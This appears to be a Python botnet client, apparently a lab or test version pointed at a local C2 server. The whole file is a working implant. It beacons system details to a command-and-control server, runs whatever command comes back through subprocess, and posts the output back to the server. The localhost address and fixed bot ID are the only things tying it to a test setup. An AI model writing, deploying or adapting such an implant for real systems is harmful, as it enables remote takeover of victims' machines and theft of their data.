import requests
import subprocess
import platform
import time
import json
from uuid import getnode as get_mac

# Configuration
C2_SERVER = "http://127.0.0.1:5000"  # Local test server
BEACON_INTERVAL = 30  # Seconds between check-ins
#BOT_ID = f"{get_mac()}-{platform.node()}"  # Unique bot identifier
BOT_ID ="1234"

def send_ack(output):
    """Send command execution results back to C2"""
    try:
        requests.post(
            f"{C2_SERVER}/ack",
            json={
                "bot_id": BOT_ID,
                "output": output,
                "status": "completed"
            },
            timeout=5
        )
    except Exception as e:
        print(f"[!] Failed to send ack: {e}")

def execute_command(cmd):
    """Execute command and return output"""
    try:
        result = subprocess.run(
            cmd.split(),
            capture_output=True,
            text=True,
            timeout=30
        )
        output = result.stdout if result.stdout else result.stderr
        send_ack(output)
        return output
    except Exception as e:
        send_ack(f"Command failed: {str(e)}")
        return None

def beacon():
    """Main C2 communication loop"""
    while True:
        try:
            # Send system info to C2
            response = requests.post(
                f"{C2_SERVER}/beacon",
                json={
                    "bot_id": BOT_ID,
                    "os": platform.system(),
                    "arch": platform.machine()
                },
                timeout=10
            )

            # Process C2 commands
            if response.status_code == 200:
                data = response.json()
                if "status" in data:
                   print(f"[*] Bot {BOT_ID} recived : {data['status']}")
                if "command" in data:
                    print(f"[*] Bot {BOT_ID} will execute command : {data['command']}")
                    execute_command(data['command'])
            
        except Exception as e:
            print(f"[!] Beacon error: {e}")
        
        time.sleep(BEACON_INTERVAL)

if __name__ == "__main__":
    print(f"[*] Bot {BOT_ID} starting...")
    beacon()